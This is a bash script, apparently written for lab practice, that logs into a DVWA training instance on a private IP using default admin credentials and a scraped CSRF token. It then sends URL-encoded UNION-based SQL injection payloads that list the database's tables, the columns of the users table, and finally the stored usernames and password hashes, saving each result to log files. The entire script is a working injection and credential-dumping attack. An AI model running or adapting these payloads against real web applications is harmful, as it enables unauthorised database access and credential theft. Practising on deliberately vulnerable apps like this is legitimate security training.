#!/bin/bash

rm cookies.txt #removes old file with cookies

#saves login cookies and login page html to local files
curl -s -c cookies.txt \
-b "security=high" \
http://192.168.56.105/DVWA/login.php \
>login.html

TOKEN=$(grep -oP "name='user_token' value='\K[^']+" login.html) #saves user token variable found in login html
PHPSESSID=$(awk '$6=="PHPSESSID"{print $7}' cookies.txt) #saves PHP session ID found in cookies

#logs in using cookies and user token
curl -s -b cookies.txt \
-b "security=high" \
-d "username=admin&password=password&user_token=$TOKEN&Login=Login" \
http://192.168.56.105/DVWA/login.php


#saves result of table name retrieval to local log file 
curl -X POST \
-b "PHPSESSID=$PHPSESSID; security=high" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "id=%27%20UNION%20SELECT%20table_name%2C%20NULL%20%20FROM%20information_schema.tables%20%20WHERE%20table_schema%20%3D%20database%28%29%23&Submit=Submit" \
http://192.168.56.105/DVWA/vulnerabilities/sqli/session-input.php

curl -X GET \
-b "PHPSESSID=$PHPSESSID; security=high" \
http://192.168.56.105/DVWA/vulnerabilities/sqli/ \
| grep -oP 'First name: \K[^<]+' \
> /home/kali/tables.log 2>&1


#saves result of column name retrieval to local log file
curl -X POST \
-b "PHPSESSID=$PHPSESSID; security=high" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "id=%27%20UNION%20SELECT%20column_name%2C%20NULL%20%20FROM%20information_schema.columns%20%20WHERE%20table_name%20%3D%20%27users%27%23&Submit=Submit" \
http://192.168.56.105/DVWA/vulnerabilities/sqli/session-input.php

curl -X GET \
-b "PHPSESSID=$PHPSESSID; security=high" \
http://192.168.56.105/DVWA/vulnerabilities/sqli/ \
| grep -oP 'First name: \K[^<]+' \
> /home/kali/columns.log 2>&1


#saves result of credential retrieval to local log file
curl -X POST \
-b "PHPSESSID=$PHPSESSID; security=high" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "id=%27%20UNION%20SELECT%20user%2C%20password%20FROM%20users%23&Submit=Submit" \
http://192.168.56.105/DVWA/vulnerabilities/sqli/session-input.php

curl -X GET \
-b "PHPSESSID=$PHPSESSID; security=high" \
http://192.168.56.105/DVWA/vulnerabilities/sqli/ \
| grep -oP 'First name: \K[^<]+|Surname: \K[^<]+' \
| paste - - \
> /home/kali/credentials.log 2>&1
